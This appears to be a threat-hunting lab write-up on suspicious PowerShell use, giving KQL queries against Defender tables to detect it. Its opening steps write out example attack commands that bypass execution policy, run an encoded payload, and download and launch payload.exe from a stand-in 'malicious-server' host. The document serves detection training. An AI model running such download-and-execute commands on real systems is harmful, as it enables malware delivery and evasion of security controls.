# Threat Event (Suspicious PowerShell Usage)
**Suspicious PowerShell Script Execution**

## Steps the "Bad Actor" Took Create Logs and IoCs:
1. Launch PowerShell in a suspicious manner (e.g., via `cmd.exe`, or another indirect method).
2. Execute encoded commands using `-encodedCommand` or download malicious scripts from external sources.
   - Example command: `powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <Base64EncodedPayload>`
3. Download malicious payload from a remote server using `Invoke-WebRequest` or `Invoke-Expression`.
   - Example command: `Invoke-WebRequest -Uri http://malicious-server/payload.exe -OutFile "payload.exe"`
4. Execute the downloaded payload.
   - Example: `Start-Process -FilePath "payload.exe"`

---

## Tables Used to Detect IoCs:

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceProcessEvents                                                            |
| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table |
| **Purpose**| Used to detect PowerShell processes executed in a suspicious manner (e.g., via `cmd.exe`, `rundll32.exe`, or with flags like `-EncodedCommand` or `-ExecutionPolicy Bypass`). |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceNetworkEvents                                                           |
| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table |
| **Purpose**| Used to detect network activity involving suspicious external requests (e.g., file download attempts using `Invoke-WebRequest` or connections to potentially malicious servers). |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceFileEvents                                                              |
| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table |
| **Purpose**| Used to detect new or suspicious file creations in temporary directories (e.g., `C:\Windows\Temp\FakeMalware`) or files associated with PowerShell activity. |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceRegistryEvents                                                            |
| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceregistryevents-table |
| **Purpose**| Used to detect unusual registry changes, particularly in execution policies or PowerShell-related settings that may indicate security feature bypasses. |

---

## Related Queries:
```kql
// PowerShell execution with encoded command
DeviceProcessEvents
| where FileName == "powershell.exe" and ProcessCommandLine contains "-encodedCommand"
| project Timestamp, DeviceName, ActionType, ProcessCommandLine

// PowerShell executed using indirect methods (e.g., cmd.exe or wininit.exe)
DeviceProcessEvents
| where FileName in~ ("cmd.exe", "wininit.exe") and ProcessCommandLine contains "powershell"
| project Timestamp, DeviceName, ActionType, ProcessCommandLine

// Suspicious network activity (downloading payload)
DeviceNetworkEvents
| where InitiatingProcessFileName == "powershell.exe" and RemoteUrl contains "malicious-server"
| project Timestamp, DeviceName, RemoteIP, RemoteUrl, RemotePort

// Detect payload download attempt using Invoke-WebRequest
DeviceProcessEvents
| where ProcessCommandLine contains "Invoke-WebRequest" and ProcessCommandLine contains "payload.exe"
| project Timestamp, DeviceName, AccountName, ActionType, ProcessCommandLine

// Deletion of suspicious files (e.g., payload.exe)
DeviceFileEvents
| where FileName == "payload.exe" and ActionType == "Deleted"
| project Timestamp, DeviceName, FileName, ActionType
```

---

## Created By:
- **Author Name**: James Harrington
- **Author Contact**: https://www.linkedin.com/in/Goodk47/
- **Date**: January 24, 2024

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**
